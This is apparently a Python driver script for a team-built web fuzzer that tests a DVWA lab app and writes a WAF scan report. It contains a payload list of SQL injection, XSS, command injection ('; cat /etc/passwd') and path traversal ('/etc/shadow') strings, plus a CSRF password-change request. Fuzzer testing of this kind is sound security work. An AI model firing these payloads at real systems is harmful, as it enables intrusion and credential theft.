import asyncio
import sys

# 1. 공통 데이터 모델 (core)
from core import AttackSurface, HttpMethod, ParamLocation, Payload
# 2. 퍼저 엔진 (fuzzer)
from fuzzer import FuzzerEngine, FuzzerResponse, build_and_send_request
# 3. 결과 리포터 (reporter)
from reporter import ReportGenerator

# 🎯 리포터의 양식에 맞추기 위해, 단순 문자열이 아닌 Payload 객체로 정의합니다.
# 수정된 10개의 테스트 페이로드 (severity -> risk_level 로 변경, description 제거)
MOCK_PAYLOADS = [
    # --- [성공하는 페이로드 (취약점 탐지됨)] ---
    Payload(value="admin' #", attack_type="SQL Injection", risk_level="CRITICAL"),
    Payload(value="' UNION SELECT user, password #", attack_type="SQL Injection", risk_level="CRITICAL"),
    Payload(value="hacked_password", attack_type="CSRF", risk_level="HIGH"),
    Payload(value="<script>alert('xss')</script>", attack_type="Cross-Site Scripting", risk_level="HIGH"),

    # --- [실패하는 페이로드 (취약점 미탐지 / 방어됨)] ---
    Payload(value="normal_user_123", attack_type="Normal Request", risk_level="LOW"),
    Payload(value="1' AND 1=2 #", attack_type="SQL Injection", risk_level="MEDIUM"),
    Payload(value="<img src=x onerror=prompt(1)>", attack_type="Cross-Site Scripting", risk_level="MEDIUM"),
    Payload(value="; cat /etc/passwd", attack_type="Command Injection", risk_level="CRITICAL"),
    Payload(value="../../../../etc/shadow", attack_type="Local File Inclusion", risk_level="HIGH"),
    Payload(value="admin\\' --", attack_type="SQL Injection", risk_level="LOW")
]

async def verbose_request_sender(session, surface, parameter, payload):
    """
    모든 패킷 전송 내역을 가로채서 출력하는 래퍼(Wrapper) 함수입니다.
    """
    # payload가 객체일 수도 있고 문자열일 수도 있으므로 안전하게 value를 추출합니다.
    p_value = getattr(payload, 'value', str(payload))
    target_name = "SQLi" if "sqli" in surface.url else "CSRF"
    
    print(f"[🚀 발사 | {target_name}] 파라미터: '{parameter}' | 무기: '{p_value}'")

    # 실제 HTTP 요청 전송 (엔진은 p_value를 필요로 할 수 있습니다)
    response = await build_and_send_request(session, surface, parameter, p_value)

    if response.error:
        print(f"   ➔ [에러]: {response.error}")
    return response


def mock_is_vulnerable(response: FuzzerResponse) -> bool:
    """
    응답 본문을 분석하여 공격 성공 여부를 판별합니다. (팀원 4의 역할 모킹)
    """
    if response.error == "TimeoutError":
         return True

    text_lower = response.text.lower() if response.text else ""

    if "password changed" in text_lower:
        return True
    if "you have an error in your sql syntax" in text_lower or "mysql_fetch_array" in text_lower:
        return True
    if text_lower.count("first name:") > 1:
        return True
    if "<script>alert('xss')</script>" in text_lower:
        return True

    return False


async def main():
    # 🚨 본인의 DVWA 로그인 세션 쿠키로 변경해 주세요!
    my_cookies = {
        "PHPSESSID": "m2p09veu8fjdrthrku7tv6pto6",
        "security": "low"
    }

    # 🎯 큐에 넣을 타겟 설정
    surfaces = [
        AttackSurface(
            url="http://snowden.kr/vulnerabilities/sqli/",
            method=HttpMethod.GET,
            param_location=ParamLocation.QUERY,
            parameters={"id": "1", "Submit": "Submit"},
            cookies=my_cookies
        ),
        AttackSurface(
            url="http://snowden.kr/vulnerabilities/csrf/",
            method=HttpMethod.GET,
            param_location=ParamLocation.QUERY,
            parameters={"password_new": "1234", "password_conf": "1234", "Change": "Change"},
            cookies=my_cookies
        )
    ]

    print("=====================================================")
    print("🚀 1단계: Fuzzer Engine 가동 및 비동기 공격 시작")
    print("=====================================================")
    
    engine = FuzzerEngine(max_concurrent_requests=3, worker_count=3, delay=0.2)

    # 엔진 실행
    stats = await engine.run(
        surfaces=surfaces,
        payloads=MOCK_PAYLOADS,
        request_sender=verbose_request_sender, 
        is_vulnerable=mock_is_vulnerable
    )

    print("\n=====================================================")
    print("📝 2단계: Reporter 모듈 가동 및 스캔 결과 보고서 생성")
    print("=====================================================")
    
    # 엔진이 수집한 통계(stats)와 취약점 내역(engine.findings)을 리포터에 전달
    reporter = ReportGenerator(stats=stats, findings=engine.findings)
    
    # 1. 터미널에 예쁜 표 형태로 출력
    reporter.print_cli_report()
    
    # 2. JSON 파일로 저장
    reporter.export_to_json("waf_scan_report_final.json")


if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    asyncio.run(main())